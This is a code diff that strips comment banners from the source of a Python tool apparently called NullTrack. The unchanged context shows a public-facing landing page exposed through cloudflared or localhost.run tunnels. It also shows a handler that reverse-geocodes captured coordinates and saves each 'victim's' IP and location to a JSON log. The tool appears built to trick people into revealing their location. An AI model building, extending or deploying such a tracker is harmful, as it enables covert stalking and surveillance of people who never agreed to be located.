@@ -19,9 +19,7 @@ from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import requests
 
-# ============================================================
-# COLOR SETUP
-# ============================================================
+
 try:
     from colorama import init, Fore, Back, Style
     init(autoreset=True)
@@ -32,16 +30,11 @@ except ImportError:
         def __getattr__(self, name): return ''
     C = S = Dummy()
 
-# ============================================================
-# CONFIGURATION
-# ============================================================
 PORT = 8080
 LOG_FILE = "nulltrack_victims.json"
 TOOLS_DIR = os.path.join(os.path.expanduser("~"), ".nulltrack")
 
-# ============================================================
-# ASCII ART BANNER - Clean, No Borders
-# ============================================================
+
 BANNER = f"""
 {C.RED}                               ███╗   ██╗██╗   ██╗██╗     ██╗     
 {C.RED}                               ████╗  ██║██║   ██║██║     ██║     
@@ -65,9 +58,6 @@ BANNER = f"""
 
 """
 
-# ============================================================
-# LANDING PAGE (unchanged)
-# ============================================================
 LANDING_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -435,9 +425,7 @@ function handleDeny(){
 </body>
 </html>"""
 
-# ============================================================
-# UTILITY FUNCTIONS
-# ============================================================
+
 def reverse_geocode(lat, lon):
     try:
         url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
@@ -476,9 +464,7 @@ def spinner(text, duration=0.8):
         time.sleep(0.07)
         i += 1
 
-# ============================================================
-# TUNNEL METHODS
-# ============================================================
+
 def install_cloudflared():
     exe_name = "cloudflared.exe" if os.name == "nt" else "cloudflared"
     exe_path = os.path.join(TOOLS_DIR, exe_name)
@@ -607,9 +593,7 @@ def start_localhost_run():
         pass
     return None
 
-# ============================================================
-# HTTP SERVER
-# ============================================================
+
 class NullTrackHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
@@ -687,14 +671,12 @@ def save_victim_data(data, ip, lat, lon):
         json.dump(logs, f, indent=2)
     print(f"    {C.GREEN}✓{S.RESET_ALL}  Data saved → {LOG_FILE}")
 
-# ============================================================
-# MAIN
-# ============================================================
+
 def main():
     os.system("cls" if os.name == "nt" else "clear")
     print(BANNER)
 
-    # Startup
+ 
     print(f"  {C.CYAN}◆ {S.BRIGHT}INITIALIZATION{S.RESET_ALL}")
     print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
 
@@ -713,7 +695,7 @@ def main():
     print(f"    {C.GREEN}✓{S.RESET_ALL}  Multi-tunnel prepared")
     print()
 
-    # Tunnel setup
+   
     print(f"  {C.CYAN}◆ {S.BRIGHT}TUNNEL CONNECTION{S.RESET_ALL}")
     print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
 
@@ -739,7 +721,7 @@ def main():
 
     print()
 
-    # Result
+   
     print(f"  {C.CYAN}◆ {S.BRIGHT}RESULT{S.RESET_ALL}")
     print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
 
